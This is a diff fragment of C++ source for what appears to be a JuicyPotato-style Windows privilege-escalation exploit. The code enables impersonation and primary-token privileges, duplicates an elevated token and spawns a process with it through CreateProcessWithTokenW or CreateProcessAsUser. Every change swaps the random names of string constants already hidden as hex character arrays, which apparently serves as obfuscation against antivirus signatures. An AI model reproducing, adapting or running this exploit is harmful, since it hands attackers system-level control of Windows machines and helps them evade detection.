 			if (iSendResult == SOCKET_ERROR) {
-				printf(hid_COM____SaSD0aaXf76m, WSAGetLastError());
+				printf(hid_COM____O8OADn3zdco1, WSAGetLastError());
 				exit(-11);
 			}
 
@@ -516,7 +516,7 @@ const int DEFAULT_BUFLEN = 4096;
 		}
 		else {
 			if (!TEST_mode)
-				printf(hid_COM____WFzc0orj0B5U, WSAGetLastError());
+				printf(hid_COM____eNf9da77HDTC, WSAGetLastError());
 
 			shutdown(ClientSocket, SD_SEND);
 			WSACleanup();
@@ -530,7 +530,7 @@ const int DEFAULT_BUFLEN = 4096;
 	iResult = shutdown(ClientSocket, SD_SEND);
 	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
 	if (iResult == SOCKET_ERROR) {
-		printf(hid_shutdo_mUZjkM1hTMBy, WSAGetLastError());
+		printf(hid_shutdo_jPdZ9BUuCljD, WSAGetLastError());
 		closesocket(ClientSocket);
 		WSACleanup();
 		exit(-1);
@@ -545,15 +545,15 @@ const int DEFAULT_BUFLEN = 4096;
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 {
 	
-	const char  hid_Priv_L_MktkB6B0sApP[] = {'\x50','\x72','\x69','\x76','\x20','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
+	const char  hid_Priv_L_k4JsDHxGIiiE[] = {'\x50','\x72','\x69','\x76','\x20','\x4c','\x6f','\x6f','\x6b','\x75','\x70','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
 
-	const char  hid_Priv_A_5pJ7asK0uCwH[] = {'\x50','\x72','\x69','\x76','\x20','\x41','\x64','\x6a','\x75','\x73','\x74','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
+	const char  hid_Priv_A_KH8cxKbhEjyo[] = {'\x50','\x72','\x69','\x76','\x20','\x41','\x64','\x6a','\x75','\x73','\x74','\x20','\x46','\x41','\x4c','\x53','\x45','\n',0};
 TOKEN_PRIVILEGES tp;
 	LUID luid;
 
 	if (!LookupPrivilegeValue(NULL, priv, &luid))
 	{
-		printf(hid_Priv_L_MktkB6B0sApP);
+		printf(hid_Priv_L_k4JsDHxGIiiE);
 		return FALSE;
 	}
 
@@ -568,7 +568,7 @@ TOKEN_PRIVILEGES tp;
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf(hid_Priv_A_5pJ7asK0uCwH);
+		printf(hid_Priv_A_KH8cxKbhEjyo);
 		return FALSE;
 	}
 
@@ -579,12 +579,12 @@ TOKEN_PRIVILEGES tp;
 int wmain(int argc, wchar_t** argv)
 {
 	
-	const char  hid________c4DxVm3xYnAy[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
+	const char  hid________BFlI18h0ekgs[] = {'\x31','\x32','\x37','\x2e','\x30','\x2e','\x30','\x2e','\x31',0};
 
-	const char  hid_Wrong__QspHogr30wVS[] = {'\x57','\x72','\x6f','\x6e','\x67','\x20','\x41','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
+	const char  hid_Wrong__wwZ0kgEESQzK[] = {'\x57','\x72','\x6f','\x6e','\x67','\x20','\x41','\x72','\x67','\x75','\x6d','\x65','\x6e','\x74','\x3a','\x20','\x25','\x73','\n',0};
 BOOL brute = FALSE;
 
-	strcpy(dcom_ip, hid________c4DxVm3xYnAy);
+	strcpy(dcom_ip, hid________BFlI18h0ekgs);
 	while ((argc > 1) && (argv[1][0] == '-'))
 	{
 		switch (argv[1][1])
@@ -648,7 +648,7 @@ BOOL brute = FALSE;
 				break;
 
 			default:
-				printf(hid_Wrong__QspHogr30wVS, argv[1]);
+				printf(hid_Wrong__wwZ0kgEESQzK, argv[1]);
 				usage();
 				exit(-1);
 		}
@@ -679,29 +679,29 @@ BOOL brute = FALSE;
 int Juicy(wchar_t *clsid, BOOL brute)
 {
 	
-	const char  hid_Testin_Ydf7Ang4gRse[] = {'\x54','\x65','\x73','\x74','\x69','\x6e','\x67','\x20','\x25','\x53','\x20','\x25','\x53','\n',0};
+	const char  hid_Testin_a7niVJ5dsoNp[] = {'\x54','\x65','\x73','\x74','\x69','\x6e','\x67','\x20','\x25','\x53','\x20','\x25','\x53','\n',0};
 
-	const char  hid______a_FubBrMApaFpD[] = {'\n','\x5b','\x2b','\x5d','\x20','\x61','\x75','\x74','\x68','\x72','\x65','\x73','\x75','\x6c','\x74','\x20','\x25','\x64','\n',0};
+	const char  hid______a_mJv3CGMVQxDJ[] = {'\n','\x5b','\x2b','\x5d','\x20','\x61','\x75','\x74','\x68','\x72','\x65','\x73','\x75','\x6c','\x74','\x20','\x25','\x64','\n',0};
 
-	const wchar_t  hid_S_e_I__wwJOQnMAVCIe[] = {'\x53','\x65','\x49','\x6d','\x70','\x65','\x72','\x73','\x6f','\x6e','\x61','\x74','\x65','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
+	const wchar_t  hid_S_e_I__44QHepiAJdn3[] = {'\x53','\x65','\x49','\x6d','\x70','\x65','\x72','\x73','\x6f','\x6e','\x61','\x74','\x65','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
 
-	const wchar_t  hid_S_e_A__OeVD0UWgsSXi[] = {'\x53','\x65','\x41','\x73','\x73','\x69','\x67','\x6e','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x54','\x6f','\x6b','\x65','\x6e','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
+	const wchar_t  hid_S_e_A__IveEnXEZddyC[] = {'\x53','\x65','\x41','\x73','\x73','\x69','\x67','\x6e','\x50','\x72','\x69','\x6d','\x61','\x72','\x79','\x54','\x6f','\x6b','\x65','\x6e','\x50','\x72','\x69','\x76','\x69','\x6c','\x65','\x67','\x65',0};
 
-	const char  hid_____Er_yE3qaARbzYd6[] = {'\x5b','\x2d','\x5d','\x20','\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
+	const char  hid_____Er_S2RrXk61rJ2Z[] = {'\x5b','\x2d','\x5d','\x20','\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
 
-	const char  hid_Error__yiQSooT4Roaf[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
+	const char  hid_Error__mxEYfbusA8mP[] = {'\x45','\x72','\x72','\x6f','\x72','\x20','\x67','\x65','\x74','\x74','\x69','\x6e','\x67','\x20','\x74','\x6f','\x6b','\x65','\x6e','\x20','\x74','\x79','\x70','\x65','\x3a','\x20','\x65','\x72','\x72','\x6f','\x72','\x20','\x63','\x6f','\x64','\x65','\x20','\x30','\x78','\x25','\x6c','\x78','\n',0};
 
-	const char  hid______C_EyEZ45wfAp7A[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid______C_aOjWbZ2H6RAS[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid______C_Wf467XIF7ngV[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x4f','\x4b','\n',0};
+	const char  hid______C_1fXXQsg74Pf8[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x57','\x69','\x74','\x68','\x54','\x6f','\x6b','\x65','\x6e','\x57','\x20','\x4f','\x4b','\n',0};
 
-	 wchar_t  hid_C______Ib1Ci1jWT8a1[] = {'\x43','\x3a','\\',0};
+	 wchar_t  hid_C______P5DP3n5u8Boo[] = {'\x43','\x3a','\\',0};
 
-	const char  hid______C_PRzY3qRkyXdc[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
+	const char  hid______C_pXvUACGbFd3U[] = {'\n','\x5b','\x2d','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x46','\x61','\x69','\x6c','\x65','\x64','\x20','\x74','\x6f','\x20','\x63','\x72','\x65','\x61','\x74','\x65','\x20','\x70','\x72','\x6f','\x63','\x3a','\x20','\x25','\x64','\n',0};
 
-	const char  hid______C_Xr8DpjItbZYa[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x4f','\x4b','\n',0};
+	const char  hid______C_zQWZPHXTuEV8[] = {'\n','\x5b','\x2b','\x5d','\x20','\x43','\x72','\x65','\x61','\x74','\x65','\x50','\x72','\x6f','\x63','\x65','\x73','\x73','\x41','\x73','\x55','\x73','\x65','\x72','\x20','\x4f','\x4b','\n',0};
 
-	const char  hid_Waitin_D83idmlIaVH3[] = {'\x57','\x61','\x69','\x74','\x69','\x6e','\x67','\x20','\x66','\x6f','\x72','\x20','\x61','\x75','\x74','\x68','\x2e','\x2e','\x2e',0};
+	const char  hid_Waitin_WR0QZWSnlnas[] = {'\x57','\x61','\x69','\x74','\x69','\x6e','\x67','\x20','\x66','\x6f','\x72','\x20','\x61','\x75','\x74','\x68','\x2e','\x2e','\x2e',0};
 PotatoAPI* test = new PotatoAPI();
 	test->startCOMListenerThread();
 
@@ -709,7 +709,7 @@ PotatoAPI* test = new PotatoAPI();
 		olestr = clsid;
 
 	if (!TEST_mode)
-		printf(hid_Testin_Ydf7Ang4gRse, olestr, g_port);
+		printf(hid_Testin_a7niVJ5dsoNp, olestr, g_port);
 
 
 	test->startRPCConnectionThread();
@@ -727,7 +727,7 @@ PotatoAPI* test = new PotatoAPI();
 			TOKEN_PRIVILEGES tkp;
 			SECURITY_DESCRIPTOR sdSecurityDescriptor;
 			if (!TEST_mode)
-				printf(hid______a_FubBrMApaFpD, test->negotiator->authResult);
+				printf(hid______a_mJv3CGMVQxDJ, test->negotiator->authResult);
 
 			fflush(stdout);
 
@@ -736,8 +736,8 @@ PotatoAPI* test = new PotatoAPI();
 				TOKEN_ALL_ACCESS, &hToken))return 0;
 
 			//enable privileges
-			EnablePriv(hToken, hid_S_e_I__wwJOQnMAVCIe);
-			EnablePriv(hToken, hid_S_e_A__OeVD0UWgsSXi);
+			EnablePriv(hToken, hid_S_e_I__44QHepiAJdn3);
+			EnablePriv(hToken, hid_S_e_A__IveEnXEZddyC);
 			PTOKEN_TYPE ptg;
 			DWORD dwl = 0;
 			HANDLE hProcessToken;
@@ -751,7 +751,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_____Er_yE3qaARbzYd6, GetLastError());
+				printf(hid_____Er_S2RrXk61rJ2Z, GetLastError());
 
 			result = DuplicateTokenEx(elevated_token,
 				TOKEN_ALL_ACCESS,
@@ -763,7 +763,7 @@ PotatoAPI* test = new PotatoAPI();
 
 			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
 			if (!dwl)
-				printf(hid_Error__yiQSooT4Roaf, GetLastError());
+				printf(hid_Error__mxEYfbusA8mP, GetLastError());
 
 			DWORD SessionId;
 			PROCESS_INFORMATION pi;
@@ -803,11 +803,11 @@ PotatoAPI* test = new PotatoAPI();
 
 				if (!result)
 				{
-					printf(hid______C_EyEZ45wfAp7A, GetLastError());
+					printf(hid______C_aOjWbZ2H6RAS, GetLastError());
 				}
 				else
 				{
-					printf(hid______C_Wf467XIF7ngV);
+					printf(hid______C_1fXXQsg74Pf8);
 					break;
 				}
 			} 
@@ -821,14 +821,14 @@ PotatoAPI* test = new PotatoAPI();
 					command,
 					nullptr, nullptr,
 					FALSE, 0, nullptr,
-					hid_C______Ib1Ci1jWT8a1, &si, &pi
+					hid_C______P5DP3n5u8Boo, &si, &pi
 				);
 
 				if (!result) {
-					printf(hid______C_PRzY3qRkyXdc, GetLastError());
+					printf(hid______C_pXvUACGbFd3U, GetLastError());
 				}
 				else {
-					printf(hid______C_Xr8DpjItbZYa);
+					printf(hid______C_zQWZPHXTuEV8);
 					break;
 				}
 			}//end argv
@@ -836,7 +836,7 @@ PotatoAPI* test = new PotatoAPI();
 			if (!result)
 				break;
 			else {
-				printf(hid_Waitin_D83idmlIaVH3);
+				printf(hid_Waitin_WR0QZWSnlnas);
 				Sleep(500);
 				fflush(stdout);
 			}
